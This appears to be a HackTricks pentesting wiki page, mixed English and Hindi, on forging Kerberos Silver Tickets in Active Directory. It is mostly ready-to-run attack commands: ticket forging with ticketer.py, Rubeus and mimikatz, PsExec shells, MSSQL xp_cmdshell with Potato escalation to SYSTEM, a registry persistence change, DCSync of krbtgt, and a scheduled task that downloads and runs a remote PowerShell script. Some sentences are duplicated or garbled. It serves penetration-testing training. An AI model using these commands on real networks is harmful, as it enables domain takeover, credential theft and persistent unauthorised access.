# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. यह **Silver Ticket** हमला Active Directory (AD) वातावरण में service tickets के शोषण पर आधारित है। This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. यह तरीका किसी service account का **NTLM hash प्राप्त करने** पर निर्भर करता है, जैसे कि computer account, ताकि Ticket Granting Service (TGS) ticket को forge किया जा सके। With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. इस forged ticket के साथ, attacker नेटवर्क पर विशिष्ट services तक पहुँच सकता है, **किसी भी user के रूप में impersonate करके**, आमतौर पर administrative privileges हासिल करने के लिए। It's emphasized that using AES keys for forging tickets is more secure and less detectable. यहाँ ज़ोर दिया जाता है कि tickets को forge करने के लिए AES keys का उपयोग अधिक सुरक्षित और कम detectable होता है।

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. हालांकि, Silver Tickets Golden Tickets की तुलना में कम detectable होते हैं क्योंकि इन्हें केवल **service account का hash** चाहिए होता है, krbtgt account की आवश्यकता नहीं होती। However, they are limited to the specific service they target. हालांकि, ये केवल उस specific service तक सीमित होते हैं जिसे वे target करते हैं। Moreover, just stealing the password of a user. इसके अलावा, सिर्फ किसी user का password चुराना।
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service. इसके अलावा, यदि आप किसी **account का password जिसमें SPN हो** compromise कर लेते हैं, तो आप उस password का उपयोग करके उस service के लिए किसी भी user के रूप में impersonate करने वाला Silver Ticket बना सकते हैं।

For ticket crafting, different tools are employed based on the operating system: Ticket crafting के लिए, ऑपरेटिंग सिस्टम के आधार पर विभिन्न tools का उपयोग किया जाता है:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS सेवा को पीड़ित के फ़ाइल सिस्टम तक पहुँचने के लिए एक सामान्य लक्ष्य के रूप में हाइलाइट किया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का भी टास्क और WMI क्वेरीज़ के लिए शोषण किया जा सकता है।

### उदाहरण: MSSQL service (MSSQLSvc) + Potato to SYSTEM

यदि आपके पास किसी SQL service account (उदा., sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए एक TGS forge कर सकते हैं और SQL service पर किसी भी user को impersonate कर सकते हैं। वहां से, xp_cmdshell को enable करके SQL service account के रूप में commands execute कर सकते हैं। यदि उस token में SeImpersonatePrivilege है, तो Potato को chain करके SYSTEM तक elevate कर लें।
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- यदि परिणामी संदर्भ में SeImpersonatePrivilege हो (अक्सर service accounts के लिए सत्य), SYSTEM प्राप्त करने के लिए Potato variant का उपयोग करें:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:
  
{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## उपलब्ध सेवाएँ

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS पर निर्भर होकर:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ परिस्थितियों में आप बस अनुरोध कर सकते हैं: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: खाता लॉगऑन
- 4634: खाता लॉगऑफ
- 4672: प्रशासक लॉगऑन

## Persistence

मशीनों को हर 30 दिनों में अपना पासवर्ड बदलने से रोकने के लिए सेट करें `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30days से बड़े मान पर सेट कर सकते हैं ताकि यह बत सके कि मशीन का पासवर्ड किस अवधि पर रोटेट होना चाहिए।

## Abusing Service tickets

नीचे के उदाहरणों में मान लें कि टिकट प्रशासक खाते का नक्कल करके हासिल किया गया है।

### CIFS

इस टिकट के साथ आप रिमोट फाइल सिस्टम में `C$` और `ADMIN$` फ़ोल्डर तक **SMB** के जरिए पहुँच सकेंगे (यदि वे एक्सपोज़्ड हैं) और रिमोट फाइल सिस्टम के किसी हिस्से में फाइल कॉपी कर सकेंगे, कुछ इस तरह:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप **psexec** का उपयोग करके होस्ट के अंदर shell प्राप्त कर सकते हैं या arbitrary commands चला सकते हैं:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

इस अनुमति से आप remote computers पर scheduled tasks बना सकते हैं और arbitrary commands चला सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन tickets के साथ आप लक्षित सिस्टम पर **WMI चला सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
निम्न पृष्ठ में **wmiexec के बारे में अधिक जानकारी** देखें:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### होस्ट + WSMAN (WINRM)

किसी कंप्यूटर पर winrm एक्सेस होने पर आप इसे **एक्सेस कर सकते हैं** और यहां तक कि PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
निम्नलिखित पृष्ठ देखें ताकि आप **रिमोट होस्ट से winrm का उपयोग करके कनेक्ट करने के अधिक तरीके** जान सकें:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि **winrm को रिमोट कंप्यूटर पर सक्रिय और सुनने की स्थिति में होना चाहिए** ताकि इसे एक्सेस किया जा सके।

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस डंप कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ में:


{{#ref}}
dcsync.md
{{#endref}}


## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
